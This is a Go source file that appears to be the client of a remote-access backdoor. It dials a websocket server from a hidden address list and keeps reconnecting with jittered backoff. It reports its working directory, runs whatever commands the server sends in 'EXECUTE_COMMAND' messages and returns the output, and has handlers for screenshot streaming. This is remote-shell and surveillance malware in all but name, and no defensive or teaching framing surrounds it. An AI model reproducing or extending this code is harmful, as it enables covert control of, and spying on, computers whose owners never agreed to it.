package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/url"
	"os"
	"time"

	"github.com/gorilla/websocket"
)

var currentWorkingDir string

func main() {
	var u = url.URL{Scheme: "ws", Host: IP_ADDRESSES[0], Path: "/"}
	backoffCounter := 0
	maxBackoff := 30 * time.Second

	// Create a local random generator instead of using global rand.Seed
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	for {
		fmt.Println("Connecting to:", u.String())

		conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			log.Println("dial failed:", err)
			// Exponential backoff with jitter
			backoffCounter++
			if backoffCounter > 10 {
				backoffCounter = 10
			}
			backoffDuration := time.Duration(1<<uint(backoffCounter)) * time.Second
			if backoffDuration > maxBackoff {
				backoffDuration = maxBackoff
			}
			// Add jitter: ±20% randomness
			jitter := time.Duration(rng.Int63n(int64(backoffDuration / 5)))
			backoffDuration = backoffDuration + jitter - backoffDuration/10

			log.Printf("Retrying in %v...\n", backoffDuration)
			time.Sleep(backoffDuration)
			continue
		}

		// Reset backoff on successful connection
		backoffCounter = 0

		fmt.Println("Connected!")

		// Send initial message
		dir, _ := os.Getwd()
		currentWorkingDir = dir
		if err := sendMessage(conn, "CREATE_CONNECTION", dir); err != nil {
			log.Println("Failed to send initial message:", err)
			conn.Close()
			continue // don't sleep here, let exponential backoff handle it
		}

		// Read until disconnected
		if err := handleConnection(conn); err != nil {
			log.Println("Connection error:", err)
		}

		conn.Close()
		time.Sleep(1 * time.Second) // brief pause before reconnect attempt
	}
}

// handleConnection manages the message reading loop
func handleConnection(conn *websocket.Conn) error {
	// Set read deadline to detect stale connections
	conn.SetReadDeadline(time.Now().Add(5 * time.Minute))

	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("websocket error: %v", err)
			}
			return err
		}

		// Reset read deadline on successful message
		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))

		var incoming Message
		if err := json.Unmarshal(msgBytes, &incoming); err != nil {
			log.Println("⚠️ Invalid JSON:", err)
			continue
		}

		log.Println("Received message:", incoming.Type)

		// Filter messages: only process if meant for this device or broadcast
		if incoming.DeviceId != "" && incoming.DeviceId != generateDeviceID() {
			continue
		}

		// Process message in separate goroutine to avoid blocking read loop
		go processMessage(conn, incoming)
	}
}

// processMessage handles incoming messages without blocking the read loop
func processMessage(conn *websocket.Conn, msg Message) {
	switch msg.Type {
	case "EXECUTE_COMMAND":
		log.Println("Executing command:", msg.Content)
		output := executeCommand(msg.Content)
		if err := sendMessage(conn, "GET_COMMAND_OUTPUT", output); err != nil {
			log.Println("Failed to send command output:", err)
		}
	case "SEND_SCREENSHOTS":
		log.Println("Starting screenshot streaming...")

	case "STOP_SCREENSHOTS":
		log.Println("Stopping screenshot streaming...")

	default:
		log.Println("Unknown message type:", msg.Type)
	}
}
